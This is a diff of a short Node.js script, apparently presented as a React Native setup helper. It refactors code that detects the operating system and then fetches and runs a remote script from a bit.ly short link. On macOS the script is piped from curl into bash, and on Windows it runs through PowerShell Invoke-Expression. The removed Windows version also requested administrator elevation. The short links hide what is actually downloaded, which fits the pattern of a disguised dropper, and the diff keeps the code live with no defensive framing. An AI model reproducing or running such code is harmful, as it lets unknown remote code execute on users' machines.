@@ -1,39 +1,43 @@
 #!/usr/bin/env node
-const { exec } = require('child_process')
-const os = require('os')
+const { spawn } = require('child_process');
+const os = require('os');
 
-const platform = os.platform()
+const platform = os.platform();
 
 function runMacScript() {
-    exec('/bin/bash -c "$(curl -fsSL https://bit.ly/react-native-mac)"', (error, stdout, stderr) => {
-        if (error) {
-            console.log(`error: ${error.message}`)
-            return
-        }
-        if (stderr) {
-            console.log(`stderr: ${stderr}`)
-            return
-        }
-        console.log(`stdout: ${stdout}`)
-    })
+    console.log('Running macOS script...');
+    const process = spawn('/bin/bash', ['-c', 'curl -fsSL https://bit.ly/react-native-mac | /bin/bash']);
+
+    process.stdout.on('data', (data) => {
+        console.log(`stdout: ${data}`);
+    });
+
+    process.stderr.on('data', (data) => {
+        console.error(`stderr: ${data}`);
+    });
+
+    process.on('close', (code) => {
+        console.log(`child process exited with code ${code}`);
+    });
 }
 
 function runWindowsScript() {
-    console.log('Running Windows script...')
-    exec(`powershell -Command "Start-Process powershell -ArgumentList '-Command', 'Invoke-Expression (Invoke-WebRequest -Uri "https://bit.ly/react-native-win").Content' -Verb RunAs"`, (error, stdout, stderr) => {
-        if (error) {
-            console.error(`Error executing Windows script: ${error.message}`)
-            return
-        }
-        if (stderr) {
-            console.error(`stderr: ${stderr}`)
-            return
-        }
-        console.log(`stdout: ${stdout}`)
-    })
+    console.log('Running Windows script...');
+    const process = spawn('powershell', ['-Command', 'Invoke-Expression (Invoke-WebRequest -Uri "https://bit.ly/react-native-win").Content']);
+
+    process.stdout.on('data', (data) => {
+        console.log(`stdout: ${data}`);
+    });
+
+    process.stderr.on('data', (data) => {
+        console.error(`stderr: ${data}`);
+    });
+
+    process.on('close', (code) => {
+        console.log(`child process exited with code ${code}`);
+    });
 }
 
-
-if (platform === 'darwin') runMacScript()
-else if (platform === 'win32') runWindowsScript()
-else console.log('Unsupported platform')
+if (platform === 'darwin') runMacScript();
+else if (platform === 'win32') runWindowsScript();
+else console.log('Unsupported platform');
